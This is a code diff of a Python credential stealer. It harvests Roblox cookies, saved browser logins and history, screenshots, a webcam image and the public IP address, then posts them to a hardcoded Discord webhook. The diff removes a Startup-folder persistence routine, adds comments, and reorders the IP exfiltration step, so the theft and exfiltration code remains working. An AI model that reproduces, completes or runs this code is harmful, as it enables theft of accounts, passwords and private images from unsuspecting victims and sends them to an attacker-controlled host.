@@ -17,23 +17,6 @@ import time
 import ctypes
 import keyboard
 from pynput import mouse, keyboard as pynput_keyboard
-
-def copy_exe_to_startup(exe_path):
-    """Copy the executable to the startup folder"""
-    startup_folder = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
-    destination_path = os.path.join(startup_folder, os.path.basename(exe_path))
-
-    if not os.path.exists(destination_path):
-        shutil.copy2(exe_path, destination_path)
-
-exe_path = os.path.abspath(sys.argv[0])
-copy_exe_to_startup(exe_path)
-
-# Ensure the script runs only on Windows
-if os.name != "nt":
-    exit()
-
-import win32crypt
 from Crypto.Cipher import AES
 
 LOCAL = os.getenv("LOCALAPPDATA")
@@ -133,7 +116,7 @@ def retrieve_roblox_cookies():
         send_to_discord(f"Error retrieving Roblox cookies: {e}")
 
 def send_to_discord(message):
-    WEBHOOK_URL = "https://discord.com/api/webhooks/1437209574556958722/iRtGtNbNqGsoPNxgyRO1WY7A8EbIvnsQertCFEpRzVU2l93cQkxTTbX68cOp1BuSjjPH"
+    WEBHOOK_URL = "https://discord.com/api/webhooks/1437209574556958722/iRtGtNbNqGsoPNxgyRO1WY7A8EbIvnsQertCFEpRzVU2l93cQkxTTbX68cOp1BuSjjPH"  # Replace with your actual webhook URL
     payload = {"content": message}
     response = requests.post(WEBHOOK_URL, json=payload)
     if response.status_code == 204:
@@ -329,7 +312,7 @@ def send_ip_embed(webhook_url, ip_address):
     }
     response = requests.post(webhook_url, json=payload, headers=headers)
     if response.status_code != 204:
-        pass
+        print(f"Failed to send IP embed: {response.status_code} {response.text}")
 
 def main():
     checked = []
@@ -447,18 +430,17 @@ def main():
             except Exception as e:
                 continue
 
-    WEBHOOK_URL = "https://discord.com/api/webhooks/1437209574556958722/iRtGtNbNqGsoPNxgyRO1WY7A8EbIvnsQertCFEpRzVU2l93cQkxTTbX68cOp1BuSjjPH"
-
-    ip_address = getip()
-    send_ip_embed(WEBHOOK_URL, ip_address)
-
+    # Collect Roblox cookies
     retrieve_roblox_cookies()
 
+    # Collect browser history
     browsers = ["Chrome", "Firefox", "Brave", "Edge", "Zen", "Opera", "Opera GX"]
     installed_browsers = [browser for browser in browsers if is_browser_installed(browser)]
 
     if not installed_browsers:
         return
+
+    WEBHOOK_URL = "https://discord.com/api/webhooks/1437209574556958722/iRtGtNbNqGsoPNxgyRO1WY7A8EbIvnsQertCFEpRzVU2l93cQkxTTbX68cOp1BuSjjPH"  # Replace with your actual webhook URL
 
     created_files = []
 
@@ -471,6 +453,7 @@ def main():
         else:
             pass
 
+    # Collect browser logins
     for browser in installed_browsers:
         logins = get_browser_logins(browser, limit=200)
         if logins:
@@ -480,6 +463,7 @@ def main():
         else:
             pass
 
+    # Take screenshots
     screenshot_paths = []
     for i in range(1):
         screenshot_path = take_screenshot(f'screenshot_{i+1}.png')
@@ -490,6 +474,7 @@ def main():
     for path in screenshot_paths:
         delete_file(path)
 
+    # Capture camera image
     image = capture_image()
     if image is not None:
         image_path = 'captured_image.jpg'
@@ -497,11 +482,17 @@ def main():
         send_file_to_discord(image_path, message="Camera Image")
         created_files.append(image_path)
 
+    # Cleanup: Delete all created files
     for file_path in created_files:
         delete_file(file_path)
 
+    # Delete Roblox cookies file
     roblox_cookies_path = os.path.join(os.getenv("TEMP", ""), "RobloxCookies.dat")
     delete_file(roblox_cookies_path)
+
+    # Get public IP and send to Discord
+    ip_address = getip()
+    send_ip_embed(WEBHOOK_URL, ip_address)
 
 if __name__ == "__main__":
     main()
